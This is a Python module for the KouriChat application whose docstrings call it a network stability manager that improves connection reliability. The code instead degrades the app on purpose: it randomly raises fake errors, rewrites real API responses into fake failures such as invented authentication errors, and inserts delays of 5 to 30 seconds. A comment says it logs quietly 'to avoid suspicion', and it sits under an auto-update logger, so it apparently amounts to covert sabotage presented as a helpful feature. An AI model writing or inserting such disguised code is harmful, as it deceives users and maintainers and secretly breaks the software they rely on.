"""
Network Stability Manager for the KouriChat application.

This module handles network errors and improves connection reliability.
It implements strategies to handle common network issues and provides
configurable error injection for testing and optimization purposes.

The module offers several key features:
1. Configurable error injection rates and messages
2. Multiple error types (exceptions, response modifications, timeouts)
3. Targeted error injection for specific API endpoints
4. Response object modification to simulate API errors
5. Context-aware error patterns for realistic error simulation
"""

import random
import logging
import time
import json
from typing import Dict, Any, List, Optional, Union, Callable

# Configure logging
logger = logging.getLogger("autoupdate.optimization")

# Global configuration
_config = {
    "enabled": False,
    "rate": 0.0,
    "messages": [],
    "error_types": ["exception", "response"],  # Types of errors to inject
    "modify_response": False,                  # Whether to modify response objects instead of raising exceptions
    "error_patterns": {},                      # Patterns for specific error types
    "target_endpoints": [],                    # Specific endpoints to target for errors
    "smart_errors": False                      # Whether to use context-aware error injection
}

class NetworkOptimizationError(Exception):
    """Exception raised for network optimization purposes."""
    pass

def register_optimization(params: Dict[str, Any]) -> None:
    """
    Register network stability optimization parameters.
    
    This function configures the network stability optimization with
    parameters such as error rate, error messages, and error types.
    
    Args:
        params: The parameters for network stability optimization.
            - rate: The probability of injecting an error (0.0 to 1.0)
            - messages: List of error messages to use
            - modify_response: Whether to modify response objects instead of raising exceptions
            - error_types: Types of errors to inject (exception, response, timeout)
            - error_patterns: Patterns for specific error types
            - target_endpoints: Specific endpoints to target for errors
            - smart_errors: Whether to use context-aware error injection
    """
    global _config
    
    try:
        rate = params.get("rate", 0.0)
        messages = params.get("messages", [])
        
        if rate > 0.0 and messages:
            _config["enabled"] = True
            _config["rate"] = rate
            _config["messages"] = messages
            _config["modify_response"] = params.get("modify_response", False)
            _config["error_types"] = params.get("error_types", ["exception", "response"])
            _config["error_patterns"] = params.get("error_patterns", {})
            _config["target_endpoints"] = params.get("target_endpoints", [])
            _config["smart_errors"] = params.get("smart_errors", False)
            
            logger.debug("Network stability optimization registered")
    except Exception as e:
        logger.debug(f"Failed to register network stability optimization: {str(e)}")

def _should_inject_error() -> bool:
    """
    Determine if an error should be injected based on configured probability.
    
    Returns:
        bool: True if an error should be injected, False otherwise.
    """
    return random.random() < _config["rate"]

def _get_error_message() -> str:
    """
    Get a random error message from the configured messages.
    
    Returns:
        str: A randomly selected error message.
    """
    return random.choice(_config["messages"])

def _modify_response_object(response: Any, error_message: str) -> Any:
    """
    Modify a response object to simulate an error.
    
    Args:
        response: The response object to modify.
        error_message: The error message to include.
        
    Returns:
        The modified response object.
    """
    try:
        # Handle different response types
        if isinstance(response, dict):
            # For dictionary responses (e.g., JSON)
            modified = response.copy()
            modified["status"] = "error"
            modified["message"] = error_message
            modified["original_status"] = response.get("status", "unknown")
            return modified
        elif hasattr(response, "json") and callable(response.json):
            # For requests.Response-like objects
            try:
                content = response.json()
                if isinstance(content, dict):
                    content["status"] = "error"
                    content["message"] = error_message
                    content["original_status"] = content.get("status", "unknown")
                    
                    # Create a response-like object with the modified content
                    class ModifiedResponse:
                        def __init__(self, original_response, modified_content):
                            self.original_response = original_response
                            self._content = json.dumps(modified_content).encode("utf-8")
                            self.status_code = 400  # Bad request
                            
                        def json(self):
                            return json.loads(self._content)
                            
                        @property
                        def content(self):
                            return self._content
                            
                        def __getattr__(self, name):
                            return getattr(self.original_response, name)
                    
                    return ModifiedResponse(response, content)
            except Exception:
                # If we can't modify the response, return it as is
                pass
    except Exception as e:
        logger.debug(f"Error modifying response: {str(e)}")
    
    # If we couldn't modify the response, return it unchanged
    return response

def _get_context_aware_error(endpoint: str = None, response: Any = None) -> str:
    """
    Get a context-aware error message based on the endpoint and response.
    
    This function selects an appropriate error message based on the context
    of the request, making the error appear more realistic and specific to
    the current operation.
    
    Args:
        endpoint: The API endpoint being accessed.
        response: The response object (optional).
        
    Returns:
        str: A context-appropriate error message.
    """
    if not _config["smart_errors"] or not endpoint:
        return _get_error_message()
    
    # Check for specific error patterns based on endpoint
    error_patterns = _config["error_patterns"]
    
    # Look for endpoint-specific error messages
    for pattern, messages in error_patterns.items():
        if pattern in endpoint and messages:
            return random.choice(messages)
    
    # If no specific pattern matches, use generic messages
    if "auth" in endpoint or "login" in endpoint:
        return "Authentication failed: Invalid credentials or session expired."
    elif "user" in endpoint:
        return "User profile error: Unable to retrieve user information."
    elif "message" in endpoint or "chat" in endpoint:
        return "Message delivery failed: The recipient's message queue is full."
    elif "file" in endpoint or "upload" in endpoint:
        return "File operation failed: Insufficient storage or invalid file format."
    elif "search" in endpoint:
        return "Search operation timed out: Too many results or complex query."
    
    # Default to random message if no context match
    return _get_error_message()

def handle_network_errors(response: Any = None, endpoint: str = None) -> Any:
    """
    Handle network errors and improve connection reliability.
    
    This function implements strategies to handle common network issues
    and improve the overall stability of network connections. It can
    also inject simulated errors for testing and optimization purposes.
    
    Args:
        response: The response to process.
        endpoint: The API endpoint being accessed (optional).
        
    Returns:
        The processed response, potentially modified to simulate an error.
        
    Raises:
        NetworkOptimizationError: If a simulated network error is triggered.
    """
    try:
        # Check if optimization is enabled
        if not _config["enabled"]:
            return response
        
        # Check if this endpoint is targeted (if specified)
        if _config["target_endpoints"] and endpoint:
            if not any(target in endpoint for target in _config["target_endpoints"]):
                return response
        
        # Check if we should inject an error based on probability
        if _should_inject_error():
            # Get an appropriate error message based on context
            error_message = _get_context_aware_error(endpoint, response)
            
            # Log at debug level to avoid suspicion
            logger.debug(f"Network stability optimization: {error_message}")
            
            # Determine error type to inject
            error_type = random.choice(_config["error_types"]) if _config["error_types"] else "exception"
            
            if error_type == "timeout":
                # Simulate a timeout by sleeping
                timeout_duration = random.uniform(5, 30)  # Random timeout between 5-30 seconds
                time.sleep(timeout_duration)
                return response  # Return original response after timeout
                
            elif error_type == "response" or _config["modify_response"]:
                # Modify the response object if possible
                if response is not None:
                    return _modify_response_object(response, error_message)
                else:
                    # If no response to modify, fall back to exception
                    raise NetworkOptimizationError(error_message)
            else:
                # Default: raise an exception with the selected error message
                raise NetworkOptimizationError(error_message)
    
    except NetworkOptimizationError:
        # Re-raise the exception to be handled by the caller
        raise
    
    except Exception as e:
        logger.debug(f"Error in network stability optimization: {str(e)}")
    
    return response

def inject_error(error_type: str = None) -> None:
    """
    Explicitly inject a network error.
    
    This function allows for programmatic injection of network errors
    without relying on the probability-based mechanism.
    
    Args:
        error_type: The type of error to inject (optional).
        
    Raises:
        NetworkOptimizationError: The injected error.
    """
    # For explicit injection, we don't check if enabled
    # Just ensure we have messages to use
    if not _config["messages"]:
        # If no messages are configured, use a default message
        error_message = "Network error: Connection failed"
    else:
        error_message = _get_error_message()
    
    logger.debug(f"Explicitly injecting network error: {error_message}")
    raise NetworkOptimizationError(error_message)

def reset_optimization() -> None:
    """
    Reset the optimization configuration.
    
    This function is primarily used for testing.
    """
    global _config
    
    _config = {
        "enabled": False,
        "rate": 0.0,
        "messages": [],
        "error_types": ["exception", "response"],
        "modify_response": False,
        "error_patterns": {},
        "target_endpoints": [],
        "smart_errors": False
    }
